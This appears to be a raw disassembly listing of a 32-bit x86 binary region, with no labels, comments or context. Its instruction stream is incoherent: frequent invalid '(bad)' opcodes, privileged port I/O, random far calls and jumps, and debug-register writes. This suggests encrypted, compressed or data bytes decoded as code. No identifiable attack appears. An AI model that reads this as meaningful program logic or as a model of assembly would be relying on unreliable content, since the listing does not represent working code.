  414e30:	ror    BYTE PTR [edx],0xe3
  414e33:	add    ebp,DWORD PTR [ecx+0x7a769aef]
  414e39:	ror    ah,0x11
  414e3c:	frstor [eax-0x187d3907]
  414e42:	fadd   DWORD PTR [ebx]
  414e44:	mov    WORD PTR [edi+0xd],?
  414e47:	popf   
  414e48:	das    
  414e49:	leave  
  414e4a:	in     eax,0xcb
  414e4c:	test   eax,0xfe5e17d2
  414e51:	adc    ebx,esp
  414e53:	cmp    DWORD PTR [ecx+0x6f],edi
  414e56:	sub    DWORD PTR [esi],ebx
  414e58:	ret    
  414e59:	shl    DWORD PTR [edi+ecx*2+0x7e],0x38
  414e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e5f:	leave  
  414e60:	rol    DWORD PTR [esi+0x1cc772f1],cl
  414e66:	jl     0x414e6e
  414e68:	and    BYTE PTR [eax-0x5b],ah
  414e6b:	pop    ecx
  414e6c:	dec    ebp
  414e6d:	mov    bh,0xba
  414e6f:	stc    
  414e70:	push   edi
  414e71:	jg     0x414e36
  414e73:	pop    ebp
  414e74:	mov    bh,0x3b
  414e76:	bound  eax,QWORD PTR [ecx]
  414e78:	fisttp DWORD PTR [ebx+0x104a4763]
  414e7e:	cmp    eax,0xc98b9d84
  414e83:	pop    esi
  414e84:	xor    DWORD PTR [ebp+0x659e768c],eax
  414e8a:	or     BYTE PTR [esi+0x22],cl
  414e8d:	call   0x4fce:0xe999b3ea
  414e94:	mov    esp,0x61e24de
  414e99:	push   ebp
  414e9a:	pop    edx
  414e9b:	or     eax,0xd239b3ce
  414ea0:	aam    0x6
  414ea2:	rcr    BYTE PTR [esp+eax*1-0x2e9c6bf5],0x38
  414eaa:	xchg   ah,ah
  414eac:	pop    edx
  414ead:	adc    edx,DWORD PTR [ebx]
  414eaf:	mov    ebx,0x733e8cda
  414eb4:	inc    esp
  414eb5:	loopne 0x414e81
  414eb7:	les    ebp,FWORD PTR ds:0x301bc738
  414ebd:	(bad)  
  414ebe:	stc    
  414ebf:	(bad)  [ecx]
  414ec1:	sub    dh,0x40
  414ec4:	dec    ebx
  414ec5:	sti    
  414ec6:	ja     0x414e69
  414ec8:	lods   eax,DWORD PTR ds:[esi]
  414ec9:	push   ebx
  414eca:	ins    BYTE PTR es:[edi],dx
  414ecb:	outs   dx,BYTE PTR ds:[esi]
  414ecc:	push   ds
  414ecd:	mov    ecx,0x3b1bde4f
  414ed2:	mov    cl,0x85
  414ed4:	adc    esi,DWORD PTR [edx+0x29]
  414ed7:	xchg   esi,eax
  414ed8:	fs (bad) 
  414eda:	mov    eax,ds:0xf2191c88
  414edf:	std    
  414ee0:	mov    cl,0x20
  414ee2:	dec    ebx
  414ee3:	jns    0x414ea9
  414ee5:	arpl   WORD PTR [edi+esi*8-0xb749f6f],bp
  414eec:	test   al,0x9e
  414eee:	xor    al,0x4b
  414ef0:	repz and DWORD PTR ds:0xb81b33af,ebp
  414ef7:	push   cs
  414ef8:	add    ch,cl
  414efa:	es push es
  414efc:	add    eax,0x428f976d
  414f01:	enter  0x9fc5,0x96
  414f05:	fwait
  414f06:	push   ebp
  414f07:	or     eax,0xe14d6bd8
  414f0c:	addr16 in eax,dx
  414f0e:	inc    edi
  414f0f:	push   esp
  414f10:	js     0x414f5a
  414f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f13:	add    eax,0xee68a12e
  414f18:	das    
  414f19:	cmp    BYTE PTR cs:[ecx],0xc2
  414f1d:	mov    esp,ecx
  414f1f:	jne    0x414f7e
  414f21:	mov    esp,0xea92cf02
  414f26:	shr    esp,1
  414f28:	cwde   
  414f29:	ja     0x414f42
  414f2b:	jnp    0x414f52
  414f2d:	lgdtd  [ecx+ecx*2]
  414f31:	push   eax
  414f32:	sub    BYTE PTR [esi],0xa4
  414f35:	xor    DWORD PTR [ebx-0x48b069ca],ebx
  414f3b:	jns    0x414f93
  414f3d:	not    BYTE PTR [esi]
  414f3f:	inc    edx
  414f40:	fldcw  WORD PTR [esi+0xa]
  414f43:	in     al,dx
  414f44:	mov    edi,es
  414f46:	pop    ecx
  414f47:	xchg   BYTE PTR [ebp-0x6e0ff788],dh
  414f4d:	(bad)  
  414f4e:	mov    bl,0xc4
  414f50:	leave  
  414f51:	scas   al,BYTE PTR es:[edi]
  414f52:	jnp    0x414f32
  414f54:	sbb    bl,al
  414f56:	or     al,0xef
  414f58:	imul   edi,DWORD PTR [eax],0xbe39ed3d
  414f5e:	xor    ebx,DWORD PTR [ebx+edi*8]
  414f61:	out    0xe8,eax
  414f63:	test   al,0xb0
  414f65:	enter  0xe28,0xca
  414f69:	test   DWORD PTR [eax+0x71],esi
  414f6c:	push   ss
  414f6d:	sbb    ah,BYTE PTR [ebx]
  414f6f:	je     0x414f0d
  414f71:	jne    0x414f18
  414f73:	aam    0x95
  414f75:	fist   WORD PTR [ecx-0x66]
  414f78:	(bad)  
  414f79:	out    dx,al
  414f7a:	lods   eax,DWORD PTR ds:[esi]
  414f7b:	fimul  DWORD PTR [ecx+0x40]
  414f7e:	(bad)  
  414f7f:	out    dx,al
  414f80:	je     0x414fa7
  414f82:	ins    BYTE PTR es:[edi],dx
  414f83:	or     ebp,esi
  414f85:	mov    ah,0x17
  414f87:	in     al,0xa3
  414f89:	ins    BYTE PTR es:[edi],dx
  414f8a:	cmp    esi,DWORD PTR [ebp-0x6c]
  414f8d:	pop    ebx
  414f8e:	retf   0x28b0
  414f91:	into   
  414f92:	push   0x46
  414f94:	test   ah,ch
  414f96:	jmp    0x7036:0xca630d8c
  414f9d:	pandn  mm7,QWORD PTR [esi]
  414fa0:	jne    0x415009
  414fa2:	adc    bl,cl
  414fa4:	scas   eax,DWORD PTR es:[edi]
  414fa5:	inc    edx
  414fa6:	scas   al,BYTE PTR es:[edi]
  414fa7:	add    DWORD PTR [ebp+0x6abff27a],0x6e692a16
  414fb1:	and    ebp,ebx
  414fb3:	jmp    0x415021
  414fb5:	fs repnz inc esp
  414fb8:	pop    gs
  414fba:	mov    eax,ds:0x41397b01
  414fbf:	stos   DWORD PTR es:[edi],eax
  414fc0:	je     0x415011
  414fc2:	nop
  414fc3:	(bad)  
  414fc5:	jne    0x415034
  414fc7:	xchg   DWORD PTR [ebx+edx*4-0x56],ecx
  414fcb:	push   ebx
  414fcc:	addr16 xchg esi,eax
  414fce:	lahf   
  414fcf:	out    0x2f,eax
  414fd1:	fild   QWORD PTR [ebx-0x4f]
  414fd4:	sbb    BYTE PTR [ebp+0x7a],0x87
  414fd8:	ins    DWORD PTR es:[edi],dx
  414fd9:	jl     0x414fec
  414fdb:	inc    ebp
  414fdc:	dec    edx
  414fdd:	or     ebp,ebp
  414fdf:	out    dx,al
  414fe0:	pop    ss
  414fe1:	fs inc ebx
  414fe3:	xchg   edi,eax
  414fe4:	push   ss
  414fe5:	iret   
  414fe6:	jns    0x41504c
  414fe8:	and    bh,BYTE PTR ds:0x2b71135b
  414fee:	inc    edi
  414fef:	mov    edx,0x61c47267
  414ff4:	lods   al,BYTE PTR ds:[esi]
  414ff5:	sub    ebx,ebx
  414ff7:	mov    ss,WORD PTR [ebp-0x57]
  414ffa:	(bad)  
  414ffb:	sti    
  414ffc:	adc    dl,BYTE PTR [edx-0x4a]
  414fff:	jmp    0xe390:0xa09c2932
  415006:	jnp    0x415054
  415008:	mov    eax,0x10cf91a3
  41500d:	pop    ecx
  41500e:	pop    ebx
  41500f:	adc    eax,0xe392e5d3
  415014:	add    ecx,DWORD PTR [ebp+0x6d416eca]
  41501a:	ret    0x122c
  41501d:	mov    dl,0xc
  41501f:	mov    al,BYTE PTR [ecx+0x59bbd0a0]
  415025:	cmp    edi,ebp
  415027:	add    edi,0xed12ca50
  41502d:	shl    bl,0xec
  415030:	test   al,0x87
  415032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415033:	xchg   esi,eax
  415034:	mov    ebx,0x127bc673
  415039:	jo     0x414fd9
  41503b:	xchg   ebp,eax
  41503c:	outs   dx,BYTE PTR ds:[esi]
  41503d:	hlt    
  41503e:	loopne 0x414fc9
  415040:	pop    esp
  415041:	xor    dh,al
  415043:	std    
  415044:	mov    ch,0x8b
  415046:	xchg   esp,eax
  415047:	cmp    BYTE PTR [ebp+0x21],ch
  41504a:	into   
  41504b:	scas   eax,DWORD PTR es:[edi]
  41504c:	jae    0x41506c
  41504e:	xlat   BYTE PTR ds:[ebx]
  41504f:	sahf   
  415050:	adc    eax,0xd1ddf856
  415055:	inc    esp
  415056:	retf   
  415057:	sub    al,0x95
  415059:	push   ebp
  41505a:	repz popa 
  41505c:	jmp    0x31b6:0x97a03bcc
  415063:	push   esp
  415064:	ds xor al,al
  415067:	jbe    0x41507a
  415069:	mov    al,0x20
  41506b:	mov    cl,0x5
  41506d:	xor    al,0xc3
  41506f:	xor    eax,0x20e7185
  415074:	push   es
  415075:	sar    ah,cl
  415077:	(bad)  
  415078:	hlt    
  415079:	jge    0x415056
  41507b:	scas   al,BYTE PTR es:[edi]
  41507c:	cld    
  41507d:	loopne 0x415011
  41507f:	fcom   DWORD PTR [ecx-0x1fe6d097]
  415085:	xor    al,0xc7
  415087:	push   edi
  415088:	fnsave [edx]
  41508a:	xchg   edx,eax
  41508b:	fisubr DWORD PTR [ecx-0x369b9cf9]
  415091:	jo     0x415028
  415093:	jle    0x415062
  415095:	and    al,0x1b
  415097:	cmp    al,0x2c
  415099:	and    eax,0xc945c520
  41509e:	popa   
  41509f:	jns    0x415109
  4150a1:	js     0x415114
  4150a3:	call   0xa290:0x96ce4d16
  4150aa:	mov    cs,WORD PTR [edi-0x4d]
  4150ad:	inc    BYTE PTR ds:0xbda8d67c
  4150b3:	mov    dl,0xed
  4150b5:	test   DWORD PTR [edi],ecx
  4150b7:	xchg   edi,eax
  4150b8:	pushf  
  4150b9:	sahf   
  4150ba:	stc    
  4150bb:	push   ebx
  4150bc:	mov    eax,ds:0x77bd1a68
  4150c1:	rcr    BYTE PTR [esi+0x23],0x22
  4150c5:	loope  0x41513b
  4150c7:	aam    0x97
  4150c9:	clc    
  4150ca:	mov    dh,0x8
  4150cc:	xor    al,0x7d
  4150ce:	call   0x22c8:0x567c6a27
  4150d5:	ret    0x2731
  4150d8:	scas   eax,DWORD PTR es:[edi]
  4150d9:	dec    eax
  4150da:	stc    
  4150db:	mov    ah,0x3f
  4150dd:	cmp    DWORD PTR [esi],edx
  4150df:	dec    esi
  4150e0:	mov    ds:0x46f80d97,eax
  4150e5:	mov    ds:0x9aeb3c6e,al
  4150ea:	jl     0x41514f
  4150ec:	inc    ebp
  4150ed:	in     eax,0x9b
  4150ef:	std    
  4150f0:	push   DWORD PTR [edx-0x5110b4db]
  4150f6:	xor    DWORD PTR es:[edx],ebx
  4150f9:	out    dx,eax
  4150fa:	jo     0x41510c
  4150fc:	enter  0x4578,0x46
  415100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415101:	ss fwait
  415103:	xor    eax,0x490dfe30
  415108:	lods   al,BYTE PTR ds:[esi]
  415109:	arpl   WORD PTR [eax+edi*2+0x4f],ax
  41510d:	(bad)  
  41510e:	sbb    esp,eax
  415110:	test   BYTE PTR [eax-0x7751dd74],0x15
  415117:	in     eax,dx
  415118:	and    DWORD PTR [ebp+0x3e],eax
  41511b:	sbb    DWORD PTR [esi+0x6a8efeb9],0xffffffa7
  415122:	inc    edi
  415123:	pop    esi
  415124:	es cld 
  415126:	std    
  415127:	adc    DWORD PTR [ecx+ecx*2-0x2ecb09b7],ecx
  41512e:	and    BYTE PTR [edx],0x50
  415131:	jmp    0xbb282e1a
  415136:	jae    0x415104
  415138:	ret    0xcb27
  41513b:	(bad)  
  41513c:	leave  
  41513d:	jl     0x4151a8
  41513f:	pop    ds
  415140:	addr16 jge 0x41517a
  415143:	fcomp  DWORD PTR [edi]
  415145:	retf   
  415146:	mov    ch,0x67
  415148:	test   al,0x3
  41514a:	outs   dx,DWORD PTR ds:[esi]
  41514b:	sub    DWORD PTR [esi],esp
  41514d:	fnsave [ecx+0x5ed528a0]
  415153:	fldl2t 
  415155:	add    al,0x43
  415157:	xchg   esi,eax
  415158:	pop    ebx
  415159:	retf   
  41515a:	cmp    ch,BYTE PTR [ebx+0x32]
  41515d:	adc    bl,BYTE PTR [esi+ebx*8]
  415160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415161:	jl     0x415172
  415163:	sbb    eax,0x573039e9
  415168:	imul   ebp,DWORD PTR [ecx],0x40
  41516b:	pop    ss
  41516c:	(bad)  
  41516d:	loop   0x4151bf
  41516f:	pop    edx
  415170:	xchg   ecx,eax
  415171:	xchg   BYTE PTR [ebp-0x12],al
  415174:	or     edi,ebx
  415176:	(bad)  
  415177:	pop    ebp
  415178:	jnp    0x41514f
  41517a:	xchg   BYTE PTR [eax],cl
  41517c:	sub    BYTE PTR [edi],bl
  41517e:	mov    ch,0x1e
  415180:	dec    ebp
  415181:	call   0x3f67:0x86c177df
  415188:	mov    DWORD PTR [edi],esp
  41518a:	sahf   
  41518b:	fsubr  QWORD PTR [edi-0x7f78dc62]
  415191:	sti    
  415192:	sahf   
  415193:	lds    ebp,FWORD PTR [eax-0x46ccf927]
  415199:	leave  
  41519a:	mov    ch,0x5e
  41519c:	adc    ebx,DWORD PTR [ecx]
  41519e:	mov    al,0x5a
  4151a0:	and    dl,BYTE PTR [edi+0x4e]
  4151a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a4:	inc    BYTE PTR [esi-0x55c7affa]
  4151aa:	cmp    eax,0x35051d7
  4151af:	adc    eax,DWORD PTR [edx+ecx*2-0x73]
  4151b3:	sub    DWORD PTR [edx-0x23cb012c],ebx
  4151b9:	jmp    0xf64c:0xa74aa24b
  4151c0:	int    0x89
  4151c2:	cdq    
  4151c3:	fbstp  TBYTE PTR [ebx+0x3b741026]
  4151c9:	xchg   dh,cl
  4151cb:	push   0x62
  4151cd:	out    dx,eax
  4151ce:	push   cs
  4151cf:	add    eax,0xefd3ebf5
  4151d4:	clc    
  4151d5:	dec    ebx
  4151d6:	stos   DWORD PTR es:[edi],eax
  4151d7:	xor    ah,dh
  4151d9:	dec    esi
  4151da:	ds dec esp
  4151dc:	xchg   edi,eax
  4151dd:	in     al,dx
  4151de:	mov    esp,DWORD PTR [ecx+0x2838dadd]
  4151e4:	cld    
  4151e5:	xchg   esi,eax
  4151e6:	loop   0x4151e6
  4151e8:	xor    eax,0xf7724daf
  4151ed:	mov    bh,0x71
  4151ef:	add    bl,bl
  4151f1:	cdq    
  4151f2:	xchg   edi,eax
  4151f3:	mov    edi,0x22f7bc37
  4151f8:	jl     0x415252
  4151fa:	sbb    edi,DWORD PTR [esi]
  4151fc:	cld    
  4151fd:	sbb    BYTE PTR [esi-0x7f],bh
  415200:	jmp    0x415266
  415202:	and    al,BYTE PTR [ebx+0x4740dcba]
  415208:	popa   
  415209:	push   ds
  41520a:	nop
  41520b:	mov    bh,0x75
  41520d:	fucomip st,st(0)
  41520f:	test   DWORD PTR [ebx-0x2],esp
  415212:	sub    DWORD PTR [edx-0x62],eax
  415215:	ds mov ecx,0x4ce5d58d
  41521b:	mov    BYTE PTR [ecx],ch
  41521d:	fsub   st(4),st
  41521f:	int    0x49
  415221:	or     eax,0x2b1946c9
  415226:	call   FWORD PTR [ebp+0x83c3c0b]
  41522c:	sbb    BYTE PTR [ecx+0xe],bh
  41522f:	sti    
  415230:	or     DWORD PTR [eax+eax*8+0x723649a2],ebp
  415237:	push   ds
  415238:	mov    al,BYTE PTR [eax+0x52]
  41523b:	mov    esi,esi
  41523d:	les    esp,FWORD PTR [ecx]
  41523f:	mov    cl,0xd2
  415241:	loopne 0x41520e
  415243:	jp     0x415274
  415245:	sub    DWORD PTR [eax],ebp
  415247:	mov    bh,0x71
  415249:	mov    WORD PTR [edx*2-0x39623946],es
  415250:	pop    esp
  415251:	push   edi
  415252:	hlt    
  415253:	add    al,0x87
  415255:	shr    DWORD PTR [ecx],1
  415257:	icebp  
  415258:	jne    0x4151ed
  41525a:	test   eax,0x5466b187
  41525f:	jbe    0x41521b
  415261:	pop    es
  415262:	inc    ebx
  415263:	retf   
  415264:	mov    esp,0x5bd9a2c7
  415269:	enter  0x8,0x50
  41526d:	jns    0x4152e3
  41526f:	cmp    al,0xad
  415271:	cmp    BYTE PTR [ebx],dl
  415273:	test   BYTE PTR [edi-0x9],al
  415276:	out    0xfe,eax
  415278:	jp     0x41528c
  41527a:	(bad)  
  41527b:	adc    al,0x70
  41527d:	call   0x60fc14b1
  415282:	test   eax,0xd5761455
  415287:	jle    0x41526a
  415289:	jo     0x4152a8
  41528b:	jmp    0x7f4a52c8
  415290:	xchg   BYTE PTR [ebp+0x1a],dl
  415293:	inc    esp
  415294:	test   ecx,0x272c1de2
  41529a:	xlat   BYTE PTR ds:[ebx]
  41529b:	xor    DWORD PTR ds:[esi],esi
  41529e:	push   ebx
  41529f:	pop    ebx
  4152a0:	call   0x9322:0xa814b5db
  4152a7:	daa    
  4152a8:	mov    db3,ebp
  4152ab:	test   al,0xcb
  4152ad:	cmp    al,0x63
  4152af:	(bad)  
  4152b1:	clc    
  4152b2:	mov    cl,0xae
  4152b4:	xor    bl,BYTE PTR [ebx-0x6e]
  4152b7:	dec    ebp
  4152b8:	aas    
  4152b9:	mov    al,ds:0x54ccc053
  4152be:	lods   eax,DWORD PTR ds:[esi]
  4152bf:	add    esi,DWORD PTR [eax+0x39]
  4152c2:	aam    0xf6
  4152c4:	and    DWORD PTR [ebx],edx
  4152c6:	sub    eax,0x2ed842cc
  4152cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152cc:	loop   0x4152f1
  4152ce:	cmp    al,dl
  4152d0:	mov    esp,DWORD PTR [ebx]
  4152d2:	mov    bl,BYTE PTR [eax+0x59c0b15b]
  4152d8:	mov    edi,0xb2d80df4
  4152dd:	pop    ds
  4152de:	repnz sbb ebx,esp
  4152e1:	push   es
  4152e2:	and    BYTE PTR [edx+eax*8-0x3],al
  4152e6:	sahf   
  4152e7:	mov    bh,0x54
  4152e9:	mov    dh,0x1f
  4152eb:	fidiv  WORD PTR [eax+0x34c9ee33]
  4152f1:	iret   
  4152f2:	add    eax,0x32070b48
  4152f7:	mov    al,0x19
  4152f9:	mov    di,0x388f
  4152fd:	push   eax
  4152fe:	push   edi
  4152ff:	mov    ds:0x25bc8751,al
  415304:	mov    bl,0xea
  415306:	add    al,0x24
  415308:	cmp    DWORD PTR [ebp-0x4c57b611],0x23d9ba56
  415312:	aad    0x34
  415314:	pop    edx
  415315:	xor    ah,BYTE PTR [esi]
  415317:	push   esi
  415318:	out    dx,eax
  415319:	cs or  al,0x99
  41531c:	mov    bh,0x24
  41531e:	mov    edi,0x6b7c57ec
  415323:	pop    DWORD PTR [esi+0x5e]
  415326:	outs   dx,DWORD PTR ds:[esi]
  415327:	ret    0x3558
  41532a:	add    ch,BYTE PTR [eax+0x8]
  41532d:	sub    eax,0xeeb655a8
  415332:	stc    
  415333:	push   ds
  415334:	test   eax,0x7a8a3dea
  415339:	or     DWORD PTR [ebx+0x671d59f5],eax
  41533f:	push   esp
  415340:	jbe    0x415357
  415342:	adc    dl,BYTE PTR [ecx+0x5]
  415345:	inc    esi
  415346:	bound  eax,QWORD PTR [esi+edx*2-0x1f49764c]
  41534d:	dec    edi
  41534e:	rol    BYTE PTR [ebp+0xb9f4127],cl
  415354:	(bad)  
  415355:	ins    DWORD PTR es:[edi],dx
  415356:	add    eax,0x25072d64
  41535b:	bound  ebx,QWORD PTR [ebx-0x6f]
  41535e:	int    0x8a
  415360:	add    esp,DWORD PTR [edi+0x2acb73f4]
  415366:	sub    al,0x95
  415368:	fmul   QWORD PTR [edx+0x10]
  41536b:	add    eax,0x90117dba
  415370:	inc    esp
  415371:	fwait
  415372:	inc    edx
  415373:	int    0xc
  415375:	jmp    0xfad9:0xa79635ff
  41537c:	mov    edi,DWORD PTR [edi]
  41537e:	fwait
  41537f:	jo     0x415330
  415381:	ret    
  415382:	out    dx,al
  415383:	sub    bl,0xb
  415386:	sahf   
  415387:	jl     0x4153d6
  415389:	popa   
  41538a:	sub    ebx,DWORD PTR [ecx+0xc]
  41538d:	fdivr  st,st(2)
  41538f:	add    DWORD PTR [edi-0x51],edi
  415392:	mov    WORD PTR [edi],?
  415394:	(bad)  
  415395:	hlt    
  415396:	lea    ebp,[edx]
  415398:	pop    ds
  415399:	sub    eax,0x656c4a16
  41539e:	into   
  41539f:	dec    ebp
  4153a0:	or     DWORD PTR [eax-0x33],ebx
  4153a3:	out    dx,eax
  4153a4:	or     eax,0x537f3e6f
  4153a9:	mov    eax,0xfed8423c
  4153ae:	jnp    0x41539c
  4153b0:	fnsave gs:[edi]
  4153b3:	stos   DWORD PTR es:[edi],eax
  4153b4:	mov    cl,BYTE PTR [eax+0x2d]
  4153b7:	idiv   DWORD PTR [ecx]
  4153b9:	jg     0x41536c
  4153bb:	adc    esp,DWORD PTR [esi-0x6]
  4153be:	sub    DWORD PTR [esi],edx
  4153c0:	xor    eax,0xb8b4b4ff
  4153c5:	xchg   esi,eax
  4153c6:	inc    edx
  4153c7:	push   edi
  4153c8:	lea    ecx,[edx-0x34ab381c]
  4153ce:	call   0x7c28:0xf51215a8
  4153d5:	stc    
  4153d6:	mov    bh,0x9e
  4153d8:	sub    al,0x16
  4153da:	cmp    DWORD PTR [eax+0xf],ebp
  4153dd:	jno    0x415439
  4153df:	mov    dh,BYTE PTR [ecx+ebp*1-0x79]
  4153e3:	mov    cl,0x2d
  4153e5:	adc    DWORD PTR [ecx-0x76d2db35],edi
  4153eb:	imul   edi,DWORD PTR [edi-0x6c],0xffffffeb
  4153ef:	arpl   sp,bx
  4153f1:	loope  0x415457
  4153f3:	scas   al,BYTE PTR es:[edi]
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	add    esp,DWORD PTR [ecx]
  4153f7:	enter  0xa563,0xa2
  4153fb:	out    0xdd,eax
  4153fd:	mov    cl,0x9
  4153ff:	pop    eax
  415400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415401:	xchg   edi,eax
  415402:	adc    eax,0x6535879
  415407:	adc    ecx,eax
  415409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41540a:	lahf   
  41540b:	jle    0x415453
  41540d:	xor    al,0x64
  41540f:	(bad)  
  415410:	cli    
  415411:	jmp    FWORD PTR [eax]
  415413:	or     cl,cl
  415415:	pop    ds
  415416:	and    cl,ah
  415418:	stos   DWORD PTR es:[edi],eax
  415419:	pop    eax
  41541a:	sbb    al,0x67
  41541c:	xor    dl,BYTE PTR [ecx-0x4a1fc737]
  415422:	xchg   DWORD PTR [ebp+0x38],esi
  415425:	sahf   
  415426:	cmp    DWORD PTR [ecx-0x379c97ca],ebp
  41542c:	cmp    al,0xfd
  41542e:	mov    ebp,0x1e422a4
  415433:	ficomp WORD PTR [ebp+0x3ee847dd]
  415439:	sub    edx,DWORD PTR [ebp+ebx*2-0x2c]
  41543d:	outs   dx,DWORD PTR ds:[esi]
  41543e:	or     eax,0x566a282f
  415443:	test   DWORD PTR [ebp-0x775c6d90],esi
  415449:	jg     0x4154c0
  41544b:	mov    ch,0x69
  41544d:	dec    ecx
  41544e:	scas   al,BYTE PTR es:[edi]
  41544f:	dec    edi
  415450:	(bad)  
  415451:	fadd   st(2),st
  415453:	test   eax,0xc0c13513
  415458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415459:	aam    0xc7
  41545b:	es retf 0xf3e9
  41545f:	jge    0x4153e2
  415461:	sbb    edx,DWORD PTR [ebp-0x4f9ae0bb]
  415467:	sbb    al,0x96
  415469:	cmp    eax,0x89280a80
  41546e:	inc    edx
  41546f:	mov    bl,0x4a
  415471:	jecxz  0x4154b4
  415473:	xchg   esi,eax
  415474:	mov    dh,BYTE PTR [esi]
  415476:	inc    ecx
  415477:	xchg   ebp,eax
  415478:	jmp    0xa413:0x2065fba
  41547f:	inc    edi
  415480:	(bad)  
  415482:	sbb    BYTE PTR [ebx-0x3],dl
  415485:	xchg   edx,eax
  415486:	cmp    ch,BYTE PTR [edx-0x32c139b4]
  41548c:	loopne 0x41547a
  41548e:	pop    ebp
  41548f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415490:	cdq    
  415491:	push   es
  415492:	sub    DWORD PTR ds:[esi+0x5a],ebx
  415496:	adc    DWORD PTR gs:[eax],esp
  415499:	jbe    0x415510
  41549b:	sahf   
  41549c:	dec    ecx
  41549d:	mov    ch,0x7f
  41549f:	cli    
  4154a0:	and    esi,edx
  4154a2:	jbe    0x415498
  4154a4:	call   0x36d874a
  4154a9:	js     0x41543c
  4154ab:	fmul   DWORD PTR [eax-0x2d]
  4154ae:	aam    0x96
  4154b0:	add    eax,0xa76098f6
  4154b5:	sti    
  4154b6:	inc    edx
  4154b7:	or     eax,0xef276a9b
  4154bc:	push   cs
  4154bd:	arpl   WORD PTR [ebx+eiz*1+0x3c091fc2],di
  4154c4:	out    dx,eax
  4154c5:	sub    dl,bl
  4154c7:	(bad)  
  4154c8:	cwde   
  4154c9:	mov    DWORD PTR [ecx],edx
  4154cb:	sub    BYTE PTR [edi-0x63],0xcd
  4154cf:	fs (bad) 
  4154d1:	add    al,0xb8
  4154d3:	or     esi,DWORD PTR [eax]
  4154d5:	stos   BYTE PTR es:[edi],al
  4154d6:	pushf  
  4154d7:	mov    ebx,DWORD PTR [ebp+0x23390b3a]
  4154dd:	xlat   BYTE PTR ds:[ebx]
  4154de:	jns    0x41546a
  4154e0:	pop    eax
  4154e1:	inc    eax
  4154e2:	jo     0x4154cd
  4154e4:	shl    DWORD PTR [ebp+0x4f1ac6e7],1
  4154ea:	neg    BYTE PTR cs:[ecx+0x5606cb8a]
  4154f1:	lds    edx,FWORD PTR ds:0x8f219712
  4154f7:	aaa    
  4154f8:	aam    0x3d
  4154fa:	rcl    BYTE PTR [ecx+edx*8+0x1c0a31ca],0xee
  415502:	and    BYTE PTR [esp],bh
  415505:	inc    ecx
  415506:	mov    edx,0x961aab11
  41550b:	sub    esp,edx
  41550d:	jg     0x415525
  41550f:	test   DWORD PTR [edx],0xbe5b6194
  415515:	retf   
  415516:	retf   0xc5fb
  415519:	outs   dx,DWORD PTR ds:[esi]
  41551a:	mov    edi,0x6004980d
  41551f:	xor    ecx,eax
  415521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415522:	scas   al,BYTE PTR es:[edi]
  415523:	ror    dh,cl
  415525:	mov    bl,0x10
  415527:	inc    ebx
  415528:	sbb    BYTE PTR [eax+0x7a18e7b5],0x49
  41552f:	sub    eax,DWORD PTR [ecx-0x50e2de16]
  415535:	mov    eax,ds:0x56818b0f
  41553a:	push   edi
  41553b:	rcl    BYTE PTR [ebx-0x54a14f61],0x42
  415542:	fbstp  TBYTE PTR [edx]
  415544:	mov    ebp,esp
  415546:	adc    bl,BYTE PTR [edi+0x64]
  415549:	shl    DWORD PTR [edi-0x3],0x40
  41554d:	dec    ebx
  41554e:	xchg   bh,cl
  415550:	xor    DWORD PTR [esi-0x147eab5f],ebx
  415556:	and    DWORD PTR [ecx-0x6e],esp
  415559:	repnz sar DWORD PTR [edi+0x7d],cl
  41555d:	jns    0x415587
  41555f:	gs xchg edx,eax
  415561:	fcomip st,st(0)
  415563:	cwde   
  415564:	cmp    DWORD PTR ds:0xc85b1e4c,esp
  41556a:	or     eax,0xa6d4f020
  41556f:	inc    edi
  415570:	icebp  
  415571:	sbb    eax,0x4c5909ff
  415576:	pop    edi
  415577:	and    al,0x59
  415579:	call   0x5ed68500
  41557e:	sbb    DWORD PTR [ecx],esi
  415580:	xchg   ebx,eax
  415581:	rcl    dh,1
  415583:	or     eax,0xd52a820a
  415588:	dec    esp
  415589:	or     al,0x49
  41558b:	mov    ebp,0x77b180c9
  415590:	loope  0x415598
  415592:	loopne 0x4155fb
  415594:	lock and esp,DWORD PTR [ecx+0x7a]
  415598:	outs   dx,BYTE PTR ds:[esi]
  415599:	cmp    DWORD PTR [ebx],ebx
  41559b:	adc    ch,BYTE PTR [edx]
  41559d:	retf   
  41559e:	mov    bh,0x0
  4155a0:	or     eax,0x499e5ecf
  4155a5:	repz mov esp,0x6e55203f
  4155ab:	dec    ecx
  4155ac:	movq   mm4,mm4
  4155af:	push   edi
  4155b0:	aas    
  4155b1:	ror    BYTE PTR [eax+0x35526b1a],1
  4155b7:	push   ebx
  4155b8:	cmp    ah,dl
  4155ba:	jb     0x4155b6
  4155bc:	inc    ebp
  4155bd:	lods   al,BYTE PTR ds:[esi]
  4155be:	mov    dh,0x48
  4155c0:	sar    DWORD PTR [ebx-0x94c5e14],cl
  4155c6:	or     eax,0xca978212
  4155cb:	mov    dl,0xb4
  4155cd:	outs   dx,BYTE PTR ds:[esi]
  4155ce:	cmc    
  4155cf:	je     0x415630
  4155d1:	enter  0x6a74,0x68
  4155d5:	and    eax,0xd4d2e1cb
  4155da:	cli    
  4155db:	(bad)  
  4155dd:	jmp    0x415568
  4155df:	and    eax,DWORD PTR [ebx]
  4155e1:	(bad)  
  4155e2:	xchg   BYTE PTR [ebx+0xf],al
  4155e5:	dec    edi
  4155e6:	dec    edx
  4155e7:	scas   eax,DWORD PTR es:[edi]
  4155e8:	add    esi,DWORD PTR [edx-0x732bb5e4]
  4155ee:	pop    edi
  4155ef:	mov    bl,BYTE PTR ds:0xb8e76cac
  4155f5:	mov    al,ds:0xecd7d265
  4155fa:	lahf   
  4155fb:	(bad)  
  4155fc:	cmp    esi,ebx
  4155fe:	mov    WORD PTR [edx+0x7928eebd],es
  415604:	lea    edi,[eax-0x1107196b]
  41560a:	push   esi
